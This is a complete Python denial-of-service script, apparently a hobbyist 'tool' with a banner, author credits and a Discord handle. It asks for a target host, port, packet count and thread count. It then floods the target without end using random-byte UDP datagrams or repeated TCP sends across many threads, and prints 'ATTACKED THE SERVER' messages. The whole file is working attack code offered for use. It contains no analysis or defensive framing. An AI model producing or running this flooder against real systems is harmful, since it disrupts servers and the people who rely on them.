#!/usr/bin/env python3
import random
import socket
import threading
     
print ("_______    ______________  ___       ____  ____________  ______")      
print ("  / ____/ |  / / ____/ __ \ \/ / |     / / / / / ____/ __ \/ ____/")
print ("/ __/  | | / / __/ / /_/ /\  /| | /| / / /_/ / __/ / /_/ / __/")
print (" / /___  | |/ / /___/ _, _/ / / | |/ |/ / __  / /___/ _, _/ /___")
print ("/_____/  |___/_____/_/ |_| /_/  |__/|__/_/ /_/_____/_/ |_/_____/")                                                               

print       (">> WELCOME TO COMUNITY EVERYWHERE <<")
print       (" >> TOOLS CREATED BY Xs AlLexa <<")
print       (">> DON'T ABUSE MY TOOLS <<") 
print       (" >> DISCORD : AlLexa#8656 << ")                      
print       (" >> DM ME IF YOU NEED HELP <<")

    
ip = str(input("  HOST/IP:"))
port = int(input(" Port:"))
choice = str(input(" Gass Entot?(y/n):"))
times = int(input(" Paket:"))
threads = int(input(" Threads:"))
def run():
	data = random._urandom(1000)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Xs EVERYWHERE ATTACKED THE SERVER")
		except:
			print("[!] ERROR SERVER TIME OUT")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Xs EVERYWHERE ATTACKED THE SERVER ")
		except:
			s.close()
			print("[*] ERROR SERVER TIME OUT")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()